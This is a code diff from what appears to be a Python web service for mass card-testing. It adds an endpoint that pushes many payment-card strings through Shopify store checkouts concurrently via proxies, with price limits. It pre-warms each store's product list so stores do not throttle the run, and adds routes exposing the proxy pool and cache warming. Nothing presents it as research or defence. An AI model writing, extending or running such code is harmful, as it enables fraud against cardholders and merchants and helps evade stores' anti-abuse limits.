+    # the first store turns away is not taken round every store and
+    # every address: the run keeps its pace instead.
+    tries = int(body.get("tries") or MASS_TRIES)
+    budget = int(body.get("budget") or MASS_BUDGET)
+
+    async def one(card_text):
+        async with gate:
+            try:
+                resp = await shopify_route(
+                    site=site, cc=card_text, proxy=proxy,
+                    max_price=max_price, min_price=min_price, key=key,
+                    _tries=tries, _budget=budget)
+            except Exception as e:
+                log.warning("a card of the mass run broke: %s", str(e)[:90])
+                return {"Response": "UNKNOWN", "error": str(e)[:90]}
+            try:
+                # The answer comes in whichever shape the road hands it
+                # over in: a plain dict, a wrapped one, or the words
+                # themselves.  All of them are read.
+                if isinstance(resp, dict):
+                    return resp
+                if isinstance(resp, (bytes, bytearray, memoryview)):
+                    return orjson.loads(bytes(resp).decode("utf-8", "replace"))
+                if isinstance(resp, str):
+                    return orjson.loads(resp)
+                raw = getattr(resp, "body", None)
+                if raw is None:
+                    log.warning("the answer came in as %s", type(resp).__name__)
+                    return {"Response": "UNKNOWN",
+                            "error": "the answer came in as %s"
+                                     % type(resp).__name__}
+                if isinstance(raw, (bytes, bytearray, memoryview)):
+                    raw = bytes(raw)
+                else:
+                    raw = str(raw).encode("utf-8", "replace")
+                return orjson.loads(raw.decode("utf-8", "replace"))
+            except Exception as e:
+                log.warning("the answer could not be read: %s", str(e)[:90])
+                return {"Response": "UNKNOWN", "error": str(e)[:90]}
+
+    # The goods list of every store is read before the cards go out.
+    #
+    # Sixteen cards that all want the same store at the same time make
+    # sixteen fetches of the same goods list, and the store that is
+    # asked that hard says no.  So the list is read once, first, and
+    # the cards find it ready.
+    if not body.get("no_warmup"):
+        await _warm_the_stores_for(site, max_price, min_price)
+
+    started = time.time()
+    answers = await asyncio.gather(*[one(c) for c in raw_cards],
+                                   return_exceptions=True)
+    out = []
+    for one_answer in answers:
+        if isinstance(one_answer, BaseException):
+            out.append({"Response": "UNKNOWN", "error": str(one_answer)[:90]})
+        else:
+            out.append(one_answer)
+    took = round(time.time() - started, 2)
+    log.info("[MASS] %d cards in %ss (%.2f cards a second)",
+             len(out), took, round(len(out) / took, 3) if took else 0)
+    return JSONResponse({"results": out, "count": len(out), "took": took})
+
 
 
 @app.get("/check")
@@ -2855,6 +3555,18 @@ async def reload_route():
     _reload_cards()
     return JSONResponse({"cards_loaded": len(_cards_cache)})
 
+
+@app.post("/prewarm")
+async def prewarm_route():
+    """Manually trigger product cache pre-warm."""
+    asyncio.create_task(_prewarm_products())
+    return JSONResponse({"status": "prewarming started", "sites": len(_load_sites_from_file())})
+
+
+@app.get("/proxies")
+async def proxies_route():
+    proxies = _load_proxies()
+    return JSONResponse({"count": len(proxies), "proxies": proxies[:5]})
 
 @app.get("/")
 async def root():
